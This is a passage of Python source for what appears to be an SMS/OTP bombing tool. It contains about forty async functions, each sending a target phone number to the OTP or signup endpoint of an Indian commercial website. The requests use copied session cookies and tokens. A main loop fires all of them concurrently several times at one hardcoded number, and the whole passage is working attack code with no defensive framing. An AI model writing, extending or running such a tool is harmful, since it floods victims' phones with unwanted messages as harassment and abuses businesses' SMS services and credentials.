                'brown_session': 'eyJpdiI6ImduXC9nMjYyWFBIXC9aVmp0K3JuZDErUT09IiwidmFsdWUiOiJCV09OTEcweXhUXC9CQWlrVHJwZENsb0lnZjFzYjdlcnNhZ1ZRdmxZWmdmU3NCNEJVWFpuRytJMUJJYnNqTjYrQyIsIm1hYyI6IjZmZjRjZTk0YWRmNWI0OTJjZGM3ZDE4YzA4MWIwNzc1YWRlNjgzMjkyMmFiNDVmYWMyMjA3MDUwMjA4MTNiZDYifQ%3D%3D',
                '_ga_VQHFT3DPHH': 'GS1.1.1688927598.1.1.1688927601.57.0.0',
                '_ga': 'GA1.2.778904199.1688927599',
                '_ga_JN38K0S1LX': 'GS1.2.1688927599.1.1.1688927602.57.0.0',
                '_clsk': '1nw0vh8|1688927602671|2|1|t.clarity.ms/collect',
            }

            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'Cookie': '_gcl_au=1.1.1957854088.1688927598; _gid=GA1.2.1582251896.1688927599; _gat_UA-78924810-1=1; _clck=8sn6gz|2|fd5|0|1285; _fbp=fb.1.1688927600216.1704611332; delpin=110001; XSRF-TOKEN=eyJpdiI6IjZRbzJ0V2s3VEJEUHJTUlZJZGVLMmc9PSIsInZhbHVlIjoiN0p2UDd1N3JBMTVrWkdYdmMyNVZaMDlPV2xqQUtYN2NjRGFrVWJkaTVadUQrWHJCSlpvaUptM3RLTnQzQ0g2byIsIm1hYyI6IjI5ZDhjMzg2MjJmOTc1OTI3NmJmZmRiNzBjOThhODc0YzEwNGQ3MWI4Mjg4NDVkOGUwZjMxMjUzNWJlMzM2YmQifQ%3D%3D; brown_session=eyJpdiI6ImduXC9nMjYyWFBIXC9aVmp0K3JuZDErUT09IiwidmFsdWUiOiJCV09OTEcweXhUXC9CQWlrVHJwZENsb0lnZjFzYjdlcnNhZ1ZRdmxZWmdmU3NCNEJVWFpuRytJMUJJYnNqTjYrQyIsIm1hYyI6IjZmZjRjZTk0YWRmNWI0OTJjZGM3ZDE4YzA4MWIwNzc1YWRlNjgzMjkyMmFiNDVmYWMyMjA3MDUwMjA4MTNiZDYifQ%3D%3D; _ga_VQHFT3DPHH=GS1.1.1688927598.1.1.1688927601.57.0.0; _ga=GA1.2.778904199.1688927599; _ga_JN38K0S1LX=GS1.2.1688927599.1.1.1688927602.57.0.0; _clsk=1nw0vh8|1688927602671|2|1|t.clarity.ms/collect',
                'Origin': 'https://mrbrownbakery.com',
                'Referer': 'https://mrbrownbakery.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'X-CSRF-TOKEN': 'JTa7wXeLBp7IvdbrFf1PHTgnbHRJ2OEcEMdct6e2',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            data = {
                'mobile': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://mrbrownbakery.com/customer/loginmobile', cookies=cookies, headers=headers, data=data)as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def moho(tarnum: int):
        try:
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Origin': 'https://www.moha.co.in',
                'Referer': 'https://www.moha.co.in/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'content-type': 'application/json',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            json_data = {
                'query': '\nmutation {\n    createAccountOTP(\n        mobilenumber:"919000002082",\n        websiteId:1\n    )\n        {\n            status\n            message\n        }\n}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://admin.moha.co.in/graphql', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def spinny(tarnum: int):
        try:
            json_data = {
                'contact_number': f'{tarnum}',
                'whatsapp': False,
                'code_len': 4,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.spinny.com/api/c/user/otp-request/', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        

    async def carandbike(tarnum: int):
        try:
            data = f'------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[mobile]"\r\n\r\n{tarnum}\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[step]"\r\n\r\n1\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[id_form_type]"\r\n\r\n35\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[id_source]"\r\n\r\n1\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[id_city]"\r\n\r\n1186\r\n------WebKitFormBoundaryDr402tofMftiZ625\r\nContent-Disposition: form-data; name="LeadForm[id_classified]"\r\n\r\n95168\r\n------WebKitFormBoundaryDr402tofMftiZ625--\r\n'
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                'https://www.carandbike.com/api/user/register/submit-lead-form',
                data=data,
            ) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        

    async def goibobo(tarnum: int):
        try:
            headers = {
                'authority': 'userservice.goibibo.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'jkO7Ivpwsh4KaQ9',
                'content-type': 'application/json',
                'origin': 'https://www.goibibo.com',
                'referer': 'https://www.goibibo.com/',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'user-identifier': '{"type":"auth","deviceId":"1854b631-190a-47a0-b34b-86f118b91029","os":"desktop","osVersion":"osVersion","appVersion":"appVersion","imie":"imie","ipAddress":"ipAddress","timeZone":"+5.30 GMT","value":""}',
                'x-request-tracker': '98a857d4-f3d3-4232-b784-fb9ff70404ce',
            }

            json_data = {
                'loginId': f'{tarnum}',
                'countryCode': '91',
                'channel': [
                    'mobile',
                ],
                'appHashKey': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                'https://userservice.goibibo.com/ext/web/desktop/send/token/OTP_IS_REG',
                headers=headers,
                json=json_data,
            ) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def tradeindia(tarnum: int):
        try:
            cookies = {
                '__cf_bm': 'skpnFGU1X_XDO8FbnlzrNrGVgKmrwf6x7wDvfq2UR4U-1688929319-0-AYH7McNCQGgXtly1rnOkW65g4K/g4WSPSt6RmawtGqGVU9hVTFDu6NEwEfMZ0WINiw0T5P2K7zIHGvGRZCc5iQE=',
                '_gid': 'GA1.2.892666642.1688929111',
                '_gat_gtag_UA_99058809_1': '1',
                '_gat_gtag_UA_4539722_1': '1',
                '_ga_7HZLX5MGZE': 'GS1.1.1688929111.1.0.1688929111.60.0.0',
                '_ga': 'GA1.1.502337897.1688929111',
                'NEW_TI_SESSION_COOKIE': 'fA89CBcEBAfBec4B6EFC7ee220b2b0F8',
                '_ga_KXVFMN679N': 'GS1.1.1688929110.1.1.1688929139.31.0.0',
            }

            headers = {
                'authority': 'api.tradeindia.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarye7QBnwbszSvb19CB',
                # 'cookie': '__cf_bm=skpnFGU1X_XDO8FbnlzrNrGVgKmrwf6x7wDvfq2UR4U-1688929319-0-AYH7McNCQGgXtly1rnOkW65g4K/g4WSPSt6RmawtGqGVU9hVTFDu6NEwEfMZ0WINiw0T5P2K7zIHGvGRZCc5iQE=; _gid=GA1.2.892666642.1688929111; _gat_gtag_UA_99058809_1=1; _gat_gtag_UA_4539722_1=1; _ga_7HZLX5MGZE=GS1.1.1688929111.1.0.1688929111.60.0.0; _ga=GA1.1.502337897.1688929111; NEW_TI_SESSION_COOKIE=fA89CBcEBAfBec4B6EFC7ee220b2b0F8; _ga_KXVFMN679N=GS1.1.1688929110.1.1.1688929139.31.0.0',
                'origin': 'https://www.tradeindia.com',
                'referer': 'https://www.tradeindia.com/',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            }

            data = f'------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{tarnum}\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="name"\r\n\r\nbhdfhbdhf\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="email"\r\n\r\njhsbbhsjd@gmail.com\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="co_name"\r\n\r\nbddfdbg\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="pin_code"\r\n\r\n110092\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="state"\r\n\r\n\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="alpha_country_code"\r\n\r\n\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="city"\r\n\r\n\r\n------WebKitFormBoundarye7QBnwbszSvb19CB\r\nContent-Disposition: form-data; name="city_id"\r\n\r\n\r\n------WebKitFormBoundarye7QBnwbszSvb19CB--\r\n'
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.tradeindia.com/home/registration/', cookies=cookies, headers=headers, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def mobex(tarnumm: int):
        try:
            json_data = {
                'variables': {
                    'mobileNumber': f'{tarnum}',
                },
                'query': 'mutation ($mobileNumber: String!) {\n  sendCodOtp(mobileNumber: $mobileNumber, websiteId: 1) {\n    message\n    status\n    __typename\n  }\n}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.mobex.in/graphql',json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def bharatmetro(tarnum: int):
        try:
            data = {
                'country_code': '+91',
                'country_short_name': 'in',
                'mobile': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.onebharatpharmacy.com/login/send_custom_otp', data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def medkart(tarnum: int):
        try:
            params = {
                'uuid': 'e435ad77-4425-404a-9958-d1899c20eaf3',
            }

            json_data = {
                'mobile_no': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://app.medkart.in/api/v1/auth/requestOTP', params=params,json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def frankross(tarnum: int):
        try:
            json_data = {
                'user': {
                    'primary_phone': f'{tarnum}',
                    'registration_source': 4,
                },
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://crm.frankrosspharmacy.com/api/v8/user/otp_signin', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        

    async def mamaearth(tarnum: int):
        try:
            json_data = {
                'contact': f'{tarnum}',
                'email': 'ndvndfk@gmail.com',
                'referralCode': '',
                'isGupshup': True,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.mamaearth.in/v1/auth/initiateSignup', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        

    async def caratlane(tarnum: int):
        try:
            cookies = {
                'rb_uid': '19g6w9lizpxyzd',
                '_vwo_uuid_v2': 'D9CB498C41C5F25581BD7E6E0E4C5DE99|ceb4190b999d650fe202e8031d043307',
                '_vwo_uuid': 'D9CB498C41C5F25581BD7E6E0E4C5DE99',
                'showHighlightForRecentlyViewedStoreLink': 'true',
                'locale': 'en_IN',
                'MADid': 'f55eabc2-773e-452e-b6f5-a8027abb9fcd',
                '_vwo_ds': '3%3Aa_0%2Ct_0%3A0%241686989424%3A52.78662552%3A%3A%3A3_0%2C2_0%3A1510319',
                '_fbp': 'fb.1.1688499538266.228941477',
                'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX19m1XiWm6nqMijWyUlqiCgKKcI8ZW2PgLU%3D',
                'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX19cZISLsNEijYhfCaLgKpMUPFl3MCbjGcc%3D',
                'G_ENABLED_IDPS': 'google',
                '_scid': 'a978f138-e348-4f78-b906-7f59e2b9a915',
                '_sctr': '1%7C1688495400000',
                'BP': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE5ZzZqbGl6cHh5emwiLCJleHAiOjE2OTE2MDU3OTksImlhdCI6MTY4ODkzMDU3MywiYXVkIjoiV2ViIiwiaXNzIjoiQ2FyYXRsYW5lIn0.PytwYOMYi1XaZc6NqDqJ7KV3D3rcSwT8Qy0Nb5AN-KimUk-4GSIXOWvtUAE7meg2697Zo51OR-MvUQ9Rav7uGw',
                'JCN': '496670204f38cbe3c82735cc9c8124f02a8f3bb8b4f3cd516d12d9a9d7',
                'vt_bp': 'true',
                '_vis_opt_s': '3%7C',
                '_vis_opt_test_cookie': '1',
                '_ga': 'GA1.2.765219621.1686989235',
                '_gid': 'GA1.2.661788978.1688930364',
                'outbrain_cid_fetch': 'true',
                'rl_trait': 'RudderEncrypt%3AU2FsdGVkX184FXtVzkDtPXsDXRt8IqlndK3IjAZlFKg%3D',
                'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX19ep0JBTKafChX2k32WuJYuarcGTmWgAj8%3D',
                'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX1%2BUJMFnUVaXVcPrMXLKDxElNRi%2BIqYJmE8%3D',
                'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX19iU%2BpLWAx6ebBs0lIG8MCl1YYKHCCfXO0o%2BVxpBbpvf4HNL9Ym4h6lBmDBIro2OOWwQfpFKgBf9w%3D%3D',
                'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX1%2Bnf%2BMKbFc0c7uT1g5BoKPBPhSnsat3Q78%3D',
                'AMCVS_6335ACBE57B1CF5C7F000101%40AdobeOrg': '1',
                'AMCV_6335ACBE57B1CF5C7F000101%40AdobeOrg': '-1124106680%7CMCIDTS%7C19548%7CMCMID%7C09547878923169733807749648256441543687%7CMCOPTOUT-1688937574s%7CNONE%7CvVersion%7C5.2.0',
                '_scid_r': 'a978f138-e348-4f78-b906-7f59e2b9a915',
                'g_state': '{"i_p":1688937635539,"i_l":1}',
                '_vwo_sn': '1941151%3A2',
                '_gat': '1',
                'rl_session': 'RudderEncrypt%3AU2FsdGVkX1%2BlDoM7oxoV%2BHwNggwmQlDp140wYuSZfBCXnotDzms4YjBpqzlByWEv9xqnt%2BjqgzyKkEsFqx9M%2F3if8VCy8hKRc%2BfufrN19TIVllOCJu7nScji4lcgL1fslmKafbaeHnMYcmhKfLa18Q%3D%3D',
                '_ga_26QWVK2NED': 'GS1.1.1688930363.3.1.1688930484.13.0.0',
            }

            headers = {
                'authority': 'www.caratlane.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': '496670204f38cbe3c82735cc9c8124f02a8f3bb8b4f3cd516d12d9a9d7',
                'content-type': 'application/json',
                # 'cookie': 'rb_uid=19g6w9lizpxyzd; _vwo_uuid_v2=D9CB498C41C5F25581BD7E6E0E4C5DE99|ceb4190b999d650fe202e8031d043307; _vwo_uuid=D9CB498C41C5F25581BD7E6E0E4C5DE99; showHighlightForRecentlyViewedStoreLink=true; locale=en_IN; MADid=f55eabc2-773e-452e-b6f5-a8027abb9fcd; _vwo_ds=3%3Aa_0%2Ct_0%3A0%241686989424%3A52.78662552%3A%3A%3A3_0%2C2_0%3A1510319; _fbp=fb.1.1688499538266.228941477; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19m1XiWm6nqMijWyUlqiCgKKcI8ZW2PgLU%3D; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19cZISLsNEijYhfCaLgKpMUPFl3MCbjGcc%3D; G_ENABLED_IDPS=google; _scid=a978f138-e348-4f78-b906-7f59e2b9a915; _sctr=1%7C1688495400000; BP=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE5ZzZqbGl6cHh5emwiLCJleHAiOjE2OTE2MDU3OTksImlhdCI6MTY4ODkzMDU3MywiYXVkIjoiV2ViIiwiaXNzIjoiQ2FyYXRsYW5lIn0.PytwYOMYi1XaZc6NqDqJ7KV3D3rcSwT8Qy0Nb5AN-KimUk-4GSIXOWvtUAE7meg2697Zo51OR-MvUQ9Rav7uGw; JCN=496670204f38cbe3c82735cc9c8124f02a8f3bb8b4f3cd516d12d9a9d7; vt_bp=true; _vis_opt_s=3%7C; _vis_opt_test_cookie=1; _ga=GA1.2.765219621.1686989235; _gid=GA1.2.661788978.1688930364; outbrain_cid_fetch=true; rl_trait=RudderEncrypt%3AU2FsdGVkX184FXtVzkDtPXsDXRt8IqlndK3IjAZlFKg%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19ep0JBTKafChX2k32WuJYuarcGTmWgAj8%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BUJMFnUVaXVcPrMXLKDxElNRi%2BIqYJmE8%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19iU%2BpLWAx6ebBs0lIG8MCl1YYKHCCfXO0o%2BVxpBbpvf4HNL9Ym4h6lBmDBIro2OOWwQfpFKgBf9w%3D%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2Bnf%2BMKbFc0c7uT1g5BoKPBPhSnsat3Q78%3D; AMCVS_6335ACBE57B1CF5C7F000101%40AdobeOrg=1; AMCV_6335ACBE57B1CF5C7F000101%40AdobeOrg=-1124106680%7CMCIDTS%7C19548%7CMCMID%7C09547878923169733807749648256441543687%7CMCOPTOUT-1688937574s%7CNONE%7CvVersion%7C5.2.0; _scid_r=a978f138-e348-4f78-b906-7f59e2b9a915; g_state={"i_p":1688937635539,"i_l":1}; _vwo_sn=1941151%3A2; _gat=1; rl_session=RudderEncrypt%3AU2FsdGVkX1%2BlDoM7oxoV%2BHwNggwmQlDp140wYuSZfBCXnotDzms4YjBpqzlByWEv9xqnt%2BjqgzyKkEsFqx9M%2F3if8VCy8hKRc%2BfufrN19TIVllOCJu7nScji4lcgL1fslmKafbaeHnMYcmhKfLa18Q%3D%3D; _ga_26QWVK2NED=GS1.1.1688930363.3.1.1688930484.13.0.0',
                'cookieenabled': 'true',
                'cs-request': 'true',
                'ib': 'false',
                'origin': 'https://www.caratlane.com',
                'referer': 'https://www.caratlane.com/login',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'setsamesite': 'true',
                'uniqid': '19g6w9lizpxyzd-1688930484991',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'x-amzn-trace-id': 'uniqid=19g6w9lizpxyzd-1688930484991',
                'x-authorization': '496670204f38cbe3c82735cc9c8124f02a8f3bb8b4f3cd516d12d9a9d7',
            }

            json_data = {
                'query': '\n        mutation {\n            SendOtp( \n                input: {\n        mobile: "9990000082",\n        isdCode: "91",\n        otpType: "registerOtp"\n      }\n            ) {\n                status {\n                    message\n                    code\n                }\n            }\n        }\n    ',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.caratlane.com/cg/dhevudu', cookies=cookies, headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def hometriangle(tarnum: int):
        try:
            json_data = {
                'phoneNumber': f'{tarnum}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://hometriangle.com/api/self/xauth/login/otp', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def droom(tarnum: int):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': 'https://droom.in/individual/account-signup',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://droom.in',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Connection': 'keep-alive',
                'Alt-Used': 'droom.in',
            }

            data = {
                'mobile_phone': '9990212082',
                'email': 'linux@gmail.com',
                'captcha_value': '',
                'channel': '',
                '_token': 'DMYilFdihdPSQh5YoxjNthim5ku9w1HliG6uLLPR',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://droom.in/send-onboard-otp',headers=headers, data=data)as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def pharmaeasy(tarnum: int):
        try:
            json_data = {
                'param': '9990212082',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://pharmeasy.in/apt-api/login/send-otp', json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def biomall(tarnum: int):
        try:

            data = {
                'phn': '8287844474',
                'code': '91',
                'email': 'kuy@gmail.com',
            }            
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.biomall.in/triggerOtp', data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
        
    async def mfine(tarnum: int):
        try:
            json_data = [
                {
                    'ts': '2023-07-14T16:49:59.238Z',
                    'user_id': '',
                    'device_id': 'd212a42e-736f-4fd8-afc5-4bf0ae1e3ecc',
                    'et': 'ButtonClicked',
                    'ed': 'APP',
                    'app': 'PW',
                    'pagename': '',
                    'buttonName': 'Send OTP',
                    'context': {
                        'appPath': '/consult/',
                        'loginHalfCard': False,
                        'phone': f'{tarnum}',
                        'otpType': 'signin-otp',
                    },
                    'channel': '',
                    'shareChannel': '',
                    'utm_source': '',
                    'utm_medium': '',
                    'utm_campaign': '',
                    'isMobile': False,
                    'caseId': '',
                    'profileId': '',
                    'url': 'https://www.mfine.co/consult/login?referrer=https://www.mfine.co/',
                    'host': 'www.mfine.co',
                    'referrer': 'https://www.mfine.co/',
                    'platform': 'web',
                },
            ]
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.mfine.co/consult/proxy/firehose', json=json_data) as response:
                    print(response.json)
            return "done"
        except Exception as e:
            return "failed"

    async def main(tarnum):
        print("here")
        
        for i in range (4):
            jh = await asyncio.gather(
                whitehat(tarnum ),    
                moglix(tarnum ),  
                medibuddy(tarnum ),   
                gopaysense(tarnum), 
                rapido(tarnum), 
                dunzo(tarnum),   
                byjus(tarnum ),   
                ballebazi(tarnum ),   
                zee5(tarnum),    
                doubtnut(tarnum),    
                vedantu(tarnum), 
                upgrade(tarnum), 
                physics(tarnum), 
                confirm(tarnum), 
                redbus(tarnum) ,  
                trainman(tarnum),    
                decathon(tarnum),    
                lybra(tarnum),   
                dentalcart(tarnum),  
                skecher(tarnum), 
                croma(tarnum),   
                tendercut(tarnum),   
                textbook(tarnum),    
                mg1(tarnum), 
                apollo247(tarnum),   
                unacademy(tarnum),
                Xtracover(tarnum),
                mgy(tarnum),
                # flyphone(tarnum),
                tyre(tarnum),
                winni(tarnum),
                mrbrown(tarnum),
                #moho(tarnum),
                spinny(tarnum),
                # carandbike(tarnum),
                goibobo(tarnum),
                tradeindia(tarnum),
                mobex(tarnum),
                bharatmetro(tarnum),
                medkart(tarnum),
                frankross(tarnum),
                mamaearth(tarnum),
                caratlane(tarnum),
                hometriangle(tarnum)

                )
            print(jh)
    asyncio.run(main(tarnum))
 
indsms(9990212045)
end = time.time()
print(end-start)

